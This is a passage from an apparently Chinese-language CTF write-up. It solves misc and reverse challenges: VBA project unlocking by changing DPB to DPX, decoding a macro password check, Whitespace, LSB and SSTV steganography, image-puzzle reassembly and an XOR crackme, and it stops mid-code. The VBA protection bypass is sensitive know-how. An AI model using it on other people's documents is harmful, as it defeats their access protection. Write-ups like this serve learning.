class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">DPB</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;6A68C60DC22AC22A3DD6C32A01D8603CA71D723AE102E0FFC37E6C3974F6CB68433CB3841C&quot;</span><br>TO：<br><span class="hljs-attribute">DPX</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;6A68C60DC22AC22A3DD6C32A01D8603CA71D723AE102E0FFC37E6C3974F6CB68433CB3841C&quot;</span><br></code></pre></td></tr></table></figure><p>保存之后，重新改为docm文件。打开，这样我们就能打开对应的project了。</p><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs vb"><span class="hljs-keyword">Private</span> <span class="hljs-keyword">Sub</span> CB_OK_Click()<br><span class="hljs-keyword">Dim</span> strpasw <span class="hljs-keyword">As</span> <span class="hljs-type">String</span><br><span class="hljs-keyword">Dim</span> strdec <span class="hljs-keyword">As</span> <span class="hljs-type">String</span><br><span class="hljs-keyword">Dim</span> strusrinput <span class="hljs-keyword">As</span> <span class="hljs-type">String</span><br><span class="hljs-keyword">Dim</span> t <span class="hljs-keyword">As</span> <span class="hljs-type">String</span><br>t = ChrW(<span class="hljs-number">21152</span>) &amp; ChrW(<span class="hljs-number">27833</span>) &amp; ChrW(<span class="hljs-number">21543</span>) &amp; ChrW(<span class="hljs-number">65292</span>) &amp; ChrW(<span class="hljs-number">21516</span>) &amp; ChrW(<span class="hljs-number">23398</span>) &amp; ChrW(<span class="hljs-number">20204</span>) &amp; ChrW(<span class="hljs-number">65281</span>)<br><br>strusrinput = Dialog.TextBox_Pasw<br><span class="hljs-keyword">Dim</span> sinput <span class="hljs-keyword">As</span> <span class="hljs-type">String</span><br>sinput = strusrinput<br><br><span class="hljs-keyword">If</span> (strusrinput &lt;&gt; <span class="hljs-string">&quot;&quot;</span>) <span class="hljs-keyword">Then</span><br>  strusout = Encode(strusrinput, t)<br>  <span class="hljs-keyword">If</span> (strusout = <span class="hljs-string">&quot;┤℡ǒqｘ~&quot;</span>) <span class="hljs-keyword">Then</span><br>      strdec = Decode(Dialog.Label_ls.Caption, sinput)<br>  <span class="hljs-keyword">Else</span><br>     <span class="hljs-keyword">If</span> (strusout = <span class="hljs-string">&quot;ｋGJEｇｑ&quot;</span>) <span class="hljs-keyword">Then</span><br>        strdec = Decode(Dialog.Label_ls1.Caption, sinput)<br>     <span class="hljs-keyword">Else</span><br>          <span class="hljs-keyword">If</span> (strusout = <span class="hljs-string">&quot;ЮΟopz+&quot;</span>) <span class="hljs-keyword">Then</span><br>             strdec = Decode(Dialog.Label_ls2.Caption, sinput)<br>          <span class="hljs-keyword">Else</span><br>                <span class="hljs-keyword">If</span> (strusout = <span class="hljs-string">&quot;ｚΚjrШφεあ&quot;</span>) <span class="hljs-keyword">Then</span><br>                    strdec = Decode(Dialog.Label_ls4.Caption, sinput)<br>                <span class="hljs-keyword">Else</span><br>                    <span class="hljs-keyword">If</span> (strusout = <span class="hljs-string">&quot;àǖtＵｗ┧ｈè&quot;</span>) <span class="hljs-keyword">Then</span><br>                          strdec = Decode(Dialog.Label_ls3.Caption, sinput)<br>                    <span class="hljs-keyword">Else</span><br>                          strdec = <span class="hljs-string">&quot;密码不正确,别泄气再来!&quot;</span><br>                    <span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br>                <span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br>           <span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br>      <span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br>   <span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br>   Label_CLUE.Caption = strdec<br><span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">Sub</span><br></code></pre></td></tr></table></figure><p>只要看这个按钮事件即可。</p><p>这里面要判断我们的输入是否满足要求。</p><p>我们的字符串首先进入了Encode编码了一下。而且用的是固定密钥，所以我们直接Decode对应的目标字符串就能得到我们想要的输入是什么。</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-string">&quot;┤℡ǒqｘ~&quot;</span> : 123456<br><span class="hljs-string">&quot;ｋGJEｇｑ&quot;</span> : <span class="hljs-type">aaaaaa</span><br><span class="hljs-string">&quot;ЮΟopz+&quot;</span> : 000000<br><span class="hljs-string">&quot;ｚΚjrШφεあ&quot;</span> : 墙角数枝<br><span class="hljs-string">&quot;àǖtＵｗ┧ｈè&quot;</span> : <span class="hljs-type">iloveyou</span><br></code></pre></td></tr></table></figure><p>以上是对应的字符串所需要输入的数据。</p><p>依次尝试，只有“墙角数枝”给出了提示：</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">解压密码:两只黄鹂鸣翠柳,一行白鹭上青天!<br></code></pre></td></tr></table></figure><p>Rar密码为复杂型，长度为16位，包含了字母、数字和符号。这一行诗加上符号刚好16位。我觉得就是把这句诗首字母提出来就行了，加上符号。由于要有数字，所以一改为1，两改为2。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2zhlmcl</span>,<span class="hljs-number">1</span>hblsqt!<br></code></pre></td></tr></table></figure><p>发现不对，又换了其他的密码。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2ZHLMCL</span>,<span class="hljs-number">1</span>HBLSQT!<br><span class="hljs-attribute">2zhlmcl</span>,<span class="hljs-number">1</span>HBLSQT!<br><span class="hljs-attribute">2ZHLMCL</span>,<span class="hljs-number">1</span>hblsqt!<br></code></pre></td></tr></table></figure><p>这些都不对，奇了怪了…</p><p>最后写了个脚本把所有大小写都爆破一遍，还是不行…</p><p>最后把这个小问题给了我队友，结果给他解出来了。密码是：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2zhlmcl</span>,<span class="hljs-number">1</span>hblsqt.<br></code></pre></td></tr></table></figure><p>给我干沉默了…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Dest0g3&#123;VBScr1pt_And_Hashc4t_1s_g00d&#125;</span><br></code></pre></td></tr></table></figure><h2 id="python_jail"><a class="markdownIt-Anchor" href="#python_jail"></a> Python_jail</h2><p>解压之后，有个压缩包要密码，然后有一个password和hint。看了一下password，全是空白字符，以为是SNOW隐写，但是hint里面说是一种语言，所以应该是white_space语言。</p><p><a href="https://vii5ard.github.io/whitespace/">https://vii5ard.github.io/whitespace/</a></p><p>将password里面的数据导入，点击右上角的Run运行。得到密码:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">a8e15220</span>-<span class="hljs-number">7404</span>-<span class="hljs-number">4269</span>-<span class="hljs-number">812</span>e-<span class="hljs-number">6418557</span>b7dc2<br></code></pre></td></tr></table></figure><p>解压得到一张图片。</p><p>LSB提取有些信息比较令人注意。在三通道LSB下:</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">e99881e59ca8e8bf 99e9878c5a6d7868  <span class="hljs-string">........</span> <span class="hljs-string">....Zmxh</span><br>5a3374694e574a6a 5a6d4d344e793031  Z3tiNWJj ZmM4Ny01<br>593245324c54517a 5a6a4574596a4d34  Y2E2LTQz ZjEtYjM4<br>4e4330314e325177 4f5749344f445a6a  NC01N2Qw OWI4ODZj<br>59546c3975230000 00e7949fe68890e6  YTl9u<span class="hljs-comment">#.. ........</span><br>8890e58a9f0a4669 6e6420697420696e  <span class="hljs-string">......Fi</span> nd it in<br>20796f757220666f 6c6465724e2904da   your fo lderN)<span class="hljs-string">..</span><br>046f70656eda0466 696c65da05777269  <span class="hljs-string">.open..f</span> ile.<span class="hljs-string">.wri</span><br>7465da057072696e 74a9007206000000  te.<span class="hljs-string">.prin</span> t.<span class="hljs-string">.r....</span><br>7206000000fa0766 6c61672e7079da08  r.<span class="hljs-string">.....f</span> lag.py..<br>3c6d6f64756c653e 0100000073040000  &lt;module&gt; <span class="hljs-string">....s...</span><br>000a020a01004190 409b0eccc7d6a2f9  <span class="hljs-string">......A.</span> @<span class="hljs-string">.......</span><br>df7fff3fffffffff 57fedfe2a159ef50  ..?<span class="hljs-string">....</span> W.<span class="hljs-string">...Y.P</span><br></code></pre></td></tr></table></figure><p>上面是一串base64</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gcode">ZmxhZ<span class="hljs-number">3</span>ti<span class="hljs-symbol">NWJjZmM4</span><span class="hljs-symbol">Ny01</span>Y<span class="hljs-number">2</span>E<span class="hljs-number">2</span>LTQzZjEtYj<span class="hljs-name">M4</span><span class="hljs-symbol">NC01</span><span class="hljs-symbol">N2</span>QwOWI<span class="hljs-number">4</span>ODZjYTl<span class="hljs-number">9</span>u<br>base<span class="hljs-number">64</span>：<br>flag&#123;b<span class="hljs-number">5</span>bcfc<span class="hljs-number">87</span><span class="hljs-number">-5</span>ca<span class="hljs-number">6</span><span class="hljs-number">-43</span>f<span class="hljs-number">1</span>-b<span class="hljs-number">384</span><span class="hljs-number">-57</span>d<span class="hljs-number">09</span>b<span class="hljs-number">886</span>ca<span class="hljs-number">9</span>&#125;<br><br><span class="hljs-attr"># Dest0</span><span class="hljs-name">g3</span>&#123;b<span class="hljs-number">5</span>bcfc<span class="hljs-number">87</span><span class="hljs-number">-5</span>ca<span class="hljs-number">6</span><span class="hljs-number">-43</span>f<span class="hljs-number">1</span>-b<span class="hljs-number">384</span><span class="hljs-number">-57</span>d<span class="hljs-number">09</span>b<span class="hljs-number">886</span>ca<span class="hljs-number">9</span>&#125;<br></code></pre></td></tr></table></figure><p>但是这不是我们想要的flag。我给他套了一个Dest0g3交上去不对。</p><p>下面这段话就看的我头大了。没有看懂这是啥意思。感觉像是让python脚本来写出flag。那么这个flag.py在哪里呢？</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim">Find it in your folder<br><span class="hljs-keyword">open</span> <span class="hljs-keyword">file</span> <span class="hljs-keyword">write</span> <span class="hljs-keyword">print</span> <br>flag.<span class="hljs-keyword">py</span><br><span class="hljs-symbol">&lt;module&gt;</span><br></code></pre></td></tr></table></figure><p>后面试了一下直接把flag提交了，没想到竟然过了…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># flag&#123;b5bcfc87-5ca6-43f1-b384-57d09b886ca9&#125;</span><br></code></pre></td></tr></table></figure><h2 id="4096"><a class="markdownIt-Anchor" href="#4096"></a> 4096</h2><p>启动靶机，是一个4096小游戏，在local_storage_manager.js中找到了一部分的flag。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">getPartFlag</span>(<span class="hljs-params">score</span>) &#123;<br>  <span class="hljs-keyword">if</span> (score &gt; <span class="hljs-number">10000</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Q29uZ3JhdHVsYXRpb25zLCB0aGlzIGlzIHBhcnQgb2YgdGhlIGZsYWc6IE5HVmxOeTFpTmpjekxUazNNV1E0TVdZNFlqRTNOMzA9Lg==&quot;</span>);<br>  &#125;<br>&#125;<br># 4ee7-b673-971d81f8b177&#125;<br></code></pre></td></tr></table></figure><p>在看网页元素的时候一个img很奇怪。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;favicon.png&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>大小为1，但实际上图片大小不是这个。把这个文件下载下来。</p><p>文件大小不对。这个png有12mb。很显然里面藏了东西。</p><p>二进制打开看看。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">RIFFö¾WAVEfmt <br></code></pre></td></tr></table></figure><p>在PNG头的下方还有一个RIFF头，这是一个音频文件。把PNG部分删了之后就可以用音频打开了。音频隐写我不太会说实话。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span>part_flag<span class="hljs-selector-class">.jpg</span>.....<br></code></pre></td></tr></table></figure><p>文件的尾部还有一个jpg。binwalk分离出来一个压缩包。里面是这个文件。但是需要密码。我觉得密码是在音频中。</p><p>前面部分和最后很明显是拨号音，只截取前后的DTMF的话得到的是：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">74958097831</span><br></code></pre></td></tr></table></figure><p>但这也不是密码啊。这是个什么脑洞。</p><p>问了一下我们组的人，叫我试试SSTV。说实话我是没想到是SSTV，也算是长见识了，第一次做这种题了。</p><p>sstv解码之后就是一张图片了，不过是倒过来的。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">password:<br><br><br><br><span class="hljs-constructor">MD5(<span class="hljs-params">cell</span> <span class="hljs-params">phone</span> <span class="hljs-params">number</span>)</span><br></code></pre></td></tr></table></figure><p>电话号码我们已经拿到了，所以直接md5看看。</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">MD5:</span><br><span class="hljs-number">6</span>c6551787d7071ff48400b855b851ccb<br></code></pre></td></tr></table></figure><p>结果并不是这个密码。手机号好像没有7开头的吧，而我们得到的数据最后一位是1，说不定是将得到的数据反转。试试。</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">74958097831</span> -&gt; <span class="hljs-number">13879085947</span><br>MD5:<br><span class="hljs-number">3</span>f119efa3254ae786fe44aff4582faa4<br></code></pre></td></tr></table></figure><p>结果还是不对…我是直接用的数字进行加密的，说不定是先对字符串进行编码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>md5(<span class="hljs-string">b&quot;13879085947&quot;</span>).hexdigest()<br><span class="hljs-string">&#x27;32fc1b5487cb447f792a19418b92544e&#x27;</span><br></code></pre></td></tr></table></figure><p>这下终于解开了。</p><p>结果里面是个小拼图。</p><img src="https://s2.loli.net/2022/05/26/NlDXTEFbQ5tzogG.jpg" alt="part_flag" style="zoom:50%;" /><p>这里直接用工具就可以解了，</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(kali㉿kali)-[~/gaps/gaps/bin]<br>└─$ python3 gaps --image=part_flag.jpg --size=64 --save<br><br>=== Population:  200<br>=== Generations: 20<br>=== Piece size:  64 px<br>=== Pieces:      240<br><br>=== Analyzing image: ██████████████████████████████████████████████████ 100.0% <br>=== Solving puzzle:  ███████████████████████████████████████----------- 78.9% <br><br>=== GA terminated<br>=== There was no improvement for 10 generations<br><br>=== Done in 17.401 s<br>=== Result saved as &#x27;part_flag_solution.jpg&#x27;<br>=== Close figure to exit<br></code></pre></td></tr></table></figure><p>结果这个每次跑都不太一样，没有那种可以完美复原的。看来只能自己来拼接了。</p><img src="https://s2.loli.net/2022/05/26/hZJM13C4yniNSmu.jpg" alt="part_flag_solution" style="zoom:50%;" /><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">RGVzdD<br>kMTE0Zi05Z<br>BnM3tlZDR<br>U0<br>W<br><span class="hljs-section">LQ</span><br><span class="hljs-section">==</span><br></code></pre></td></tr></table></figure><p>写个脚本跑一下结果吧。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<br><br>table = [<span class="hljs-string">&quot;RGVzdD&quot;</span>,<span class="hljs-string">&quot;kMTE0Zi05Z&quot;</span>,<span class="hljs-string">&quot;BnM3tlZDR&quot;</span>,<span class="hljs-string">&quot;U0&quot;</span>,<span class="hljs-string">&quot;W&quot;</span>,<span class="hljs-string">&quot;LQ&quot;</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> itertools.permutations(table, <span class="hljs-built_in">len</span>(table)):<br>    data = <span class="hljs-string">&#x27;&#x27;</span>.join(i) + <span class="hljs-string">&quot;==&quot;</span><br>    data = b64decode(data)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;Dest0g3&#123;&quot;</span> <span class="hljs-keyword">in</span> data:<br>        <span class="hljs-built_in">print</span>(data)<br>        <br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">b&#x27;Dest0g3&#123;ed4d114f-9eM\x16-&#x27;</span><br><span class="hljs-string">b&#x27;Dest0g3&#123;ed4d114f-9eM\x0bA&#x27;</span><br><span class="hljs-string">b&#x27;Dest0g3&#123;ed4d114f-9ee4-&#x27;</span><br><span class="hljs-string">b&#x27;Dest0g3&#123;ed4d114f-9eb\xd0S&#x27;</span><br><span class="hljs-string">b&#x27;Dest0g3&#123;ed4d114f-9d\xb4\x14\xd1&#x27;</span><br><span class="hljs-string">b&#x27;Dest0g3&#123;ed4d114f-9d\xb4\x16S&#x27;</span><br><span class="hljs-string">b&#x27;Dest0g3&#123;ed4T\xd2C\x13\x13Fb\xd3\x96V-&#x27;</span><br><span class="hljs-string">b&#x27;Dest0g3&#123;ed4T\xd2C\x13\x13Fb\xd3\x96KA&#x27;</span><br><span class="hljs-string">b&#x27;Dest0g3&#123;ed4T\xd1i\x0cLM\x19\x8bNY-&#x27;</span><br><span class="hljs-string">....</span><br><span class="hljs-string">....</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-comment"># Dest0g3&#123;ed4d114f-9ee4-</span><br></code></pre></td></tr></table></figure><p>和上面的flag进行组合得到：</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs subunit"># Dest0g3&#123;ed4d114f<span class="hljs-string">-9</span>ee4<span class="hljs-string">-4</span>ee7-b673<span class="hljs-string">-971</span>d81f8b177&#125;<br></code></pre></td></tr></table></figure><h1 id="reverse"><a class="markdownIt-Anchor" href="#reverse"></a> Reverse</h1><h2 id="simplexor"><a class="markdownIt-Anchor" href="#simplexor"></a> simpleXOR</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">int</span> v4[<span class="hljs-number">72</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-160h]</span><br>  <span class="hljs-type">char</span> v5[<span class="hljs-number">52</span>]; <span class="hljs-comment">// [rsp+120h] [rbp-40h] BYREF</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [rsp+154h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> j; <span class="hljs-comment">// [rsp+158h] [rbp-8h]</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+15Ch] [rbp-4h]</span><br><br>  v6 = <span class="hljs-number">247</span>;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input flag:&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%s&quot;</span>, v5);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">35</span>; ++i )<br>  &#123;<br>    v4[i + <span class="hljs-number">36</span>] = v5[i];<br>    v4[i] = v6 ^ (v4[i + <span class="hljs-number">36</span>] + i);<br>  &#125;<br>  <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt;= <span class="hljs-number">0x23</span>; ++j )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( v4[j] != result_0[j] )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Wrong!!!&quot;</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( j == <span class="hljs-number">35</span> )<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Success!!!&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>找到result_0的值：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0xb3</span>,<span class="hljs-number">0</span>x91,<span class="hljs-number">0</span>x82,<span class="hljs-number">0</span>x80,<span class="hljs-number">0</span>xc3,<span class="hljs-number">0</span>x9b,<span class="hljs-number">0</span>xce,<span class="hljs-number">0</span>x75,<br><span class="hljs-attribute">0xcf</span>,<span class="hljs-number">0</span>x9c,<span class="hljs-number">0</span>x9a,<span class="hljs-number">0</span>x85,<span class="hljs-number">0</span>x85,<span class="hljs-number">0</span>xcd,<span class="hljs-number">0</span>xb8,<span class="hljs-number">0</span>x84,<br><span class="hljs-attribute">0xaa</span>,<span class="hljs-number">0</span>x7d,<span class="hljs-number">0</span>xbd,<span class="hljs-number">0</span>xbb,<span class="hljs-number">0</span>xb1,<span class="hljs-number">0</span>xb5,<span class="hljs-number">0</span>x96,<span class="hljs-number">0</span>x71,<br><span class="hljs-attribute">0x8d</span>,<span class="hljs-number">0</span>x9e,<span class="hljs-number">0</span>x86,<span class="hljs-number">0</span>xbf,<span class="hljs-number">0</span>x73,<span class="hljs-number">0</span>xa8,<span class="hljs-number">0</span>xa3,<span class="hljs-number">0</span>x9c,<br><span class="hljs-attribute">0x83</span>,<span class="hljs-number">0</span>x65,<span class="hljs-number">0</span>x9e,<span class="hljs-number">0</span>x57<br></code></pre></td></tr></table></figure><p>求逆</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># solve.py</span><br><br>data = [<span class="hljs-number">0xb3</span>,<span class="hljs-number">0x91</span>,<span class="hljs-number">0x82</span>,<span class="hljs-number">0x80</span>,<br>        <span class="hljs-number">0xc3</span>,<span class="hljs-number">0x9b</span>,<span class="hljs-number">0xce</span>,<span class="hljs-number">0x75</span>,<br>        <span class="hljs-number">0xcf</span>,<span class="hljs-number">0x9c</span>,<span class="hljs-number">0x9a</span>,<span class="hljs-number">0x85</span>,<br>        <span class="hljs-number">0x85</span>,<span class="hljs-number">0xcd</span>,<span class="hljs-number">0xb8</span>,<span class="hljs-number">0x84</span>,<br>        <span class="hljs-number">0xaa</span>,<span class="hljs-number">0x7d</span>,<span class="hljs-number">0xbd</span>,<span class="hljs-number">0xbb</span>,<br>        <span class="hljs-number">0xb1</span>,<span class="hljs-number">0xb5</span>,<span class="hljs-number">0x96</span>,<span class="hljs-number">0x71</span>,<br>        <span class="hljs-number">0x8d</span>,<span class="hljs-number">0x9e</span>,<span class="hljs-number">0x86</span>,<span class="hljs-number">0xbf</span>,<br>        <span class="hljs-number">0x73</span>,<span class="hljs-number">0xa8</span>,<span class="hljs-number">0xa3</span>,<span class="hljs-number">0x9c</span>,<br>        <span class="hljs-number">0x83</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x9e</span>,<span class="hljs-number">0x57</span>]<br><br>key = <span class="hljs-number">247</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data)):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>((data[i]^key) - i), end=<span class="hljs-string">&quot;&quot;</span>)<br>    <br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span>)<br><br><span class="hljs-comment"># Dest0g3&#123;0bcgf-AdMy892-KobPW-hB6LTqG&#125;</span><br></code></pre></td></tr></table></figure><h2 id="hi"><a class="markdownIt-Anchor" href="#hi"></a> hi</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 